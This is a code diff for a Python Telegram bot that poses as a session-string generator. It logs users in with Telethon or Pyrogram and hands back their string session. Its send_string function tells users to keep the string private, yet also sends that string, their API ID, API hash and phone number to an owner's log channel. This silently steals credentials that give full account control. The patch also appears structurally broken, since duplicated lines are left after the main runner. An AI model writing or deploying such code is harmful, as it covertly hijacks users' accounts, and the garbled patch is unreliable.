@@ -6,7 +6,7 @@ from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 from pyrogram import Client
-from pyrogram.errors import BadRequest, SessionPasswordNeeded
+from pyrogram.errors import SessionPasswordNeeded
 from flask import Flask
 import threading
 
@@ -21,6 +21,10 @@ CHANNELS = [
 
 bot = telebot.TeleBot(API_TOKEN, parse_mode="HTML")
 user_sessions = {}  # store user temporary data
+
+# global event loop
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
 
 # Flask app (for uptime ping)
 app = Flask(__name__)
@@ -130,9 +134,9 @@ def get_phone(message):
     bot.send_message(message.chat.id, "📩 Please wait... sending code to your phone.")
     
     if user_sessions[user_id]["lib"] == "telethon":
-        asyncio.run(telethon_login(user_id))
+        loop.create_task(telethon_login(user_id))
     else:
-        asyncio.run(pyrogram_login(user_id))
+        loop.create_task(pyrogram_login(user_id))
 
 
 # ========== TELETHON LOGIN ==========
@@ -157,7 +161,7 @@ async def telethon_login(user_id):
 def get_telethon_otp(message):
     user_id = message.from_user.id
     code = message.text.strip().replace(" ", "")
-    asyncio.run(complete_telethon_login(user_id, code))
+    loop.create_task(complete_telethon_login(user_id, code))
 
 
 async def complete_telethon_login(user_id, code):
@@ -180,7 +184,7 @@ async def complete_telethon_login(user_id, code):
 def get_telethon_password(message):
     user_id = message.from_user.id
     password = message.text.strip()
-    asyncio.run(complete_telethon_with_password(user_id, password))
+    loop.create_task(complete_telethon_with_password(user_id, password))
 
 
 async def complete_telethon_with_password(user_id, password):
@@ -218,7 +222,7 @@ async def pyrogram_login(user_id):
 def get_pyrogram_otp(message):
     user_id = message.from_user.id
     code = message.text.strip().replace(" ", "")
-    asyncio.run(complete_pyrogram_login(user_id, code))
+    loop.create_task(complete_pyrogram_login(user_id, code))
 
 
 async def complete_pyrogram_login(user_id, code):
@@ -240,7 +244,7 @@ async def complete_pyrogram_login(user_id, code):
 def get_pyrogram_password(message):
     user_id = message.from_user.id
     password = message.text.strip()
-    asyncio.run(complete_pyrogram_with_password(user_id, password))
+    loop.create_task(complete_pyrogram_with_password(user_id, password))
 
 
 async def complete_pyrogram_with_password(user_id, password):
@@ -261,6 +265,26 @@ def send_string(chat_id, data, string):
     lib = data["lib"].capitalize()
     username = bot.get_chat(chat_id).username or "NoUsername"
     
+    bot.send_message(chat_id, f"✅ Your <b>{lib}</b> String Session:\n\n<code>{string}</code>\n\n📌 Save this safely and don't share it with anyone!")
+    try:
+        bot.send_message(
+            OWNER_LOG_CHANNEL,
+            f"🔔 New {lib} String Generated\n\n👤 User: @{username}\n🆔 User ID: {chat_id}\n🆔 API ID: <code>{data['api_id']}</code>\n🔑 API HASH: <code>{data['api_hash']}</code>\n📱 Phone: {data['phone']}\n📜 String:\n<code>{string}</code>"
+        )
+    except Exception as e:
+        print(f"Failed to send to log channel: {e}")
+
+
+# === RUN BOT ===
+if __name__ == "__main__":
+    print("🚀 Session String Generator Bot Started...")
+
+    def run_loop():
+        loop.run_forever()
+
+    threading.Thread(target=run_loop, daemon=True).start()
+    threading.Thread(target=bot.infinity_polling, daemon=True).start()
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))  
     bot.send_message(chat_id, f"✅ Your <b>{lib}</b> String Session:\n\n<code>{string}</code>\n\n📌 Save this safely and don't share it with anyone!")
     try:
         bot.send_message(
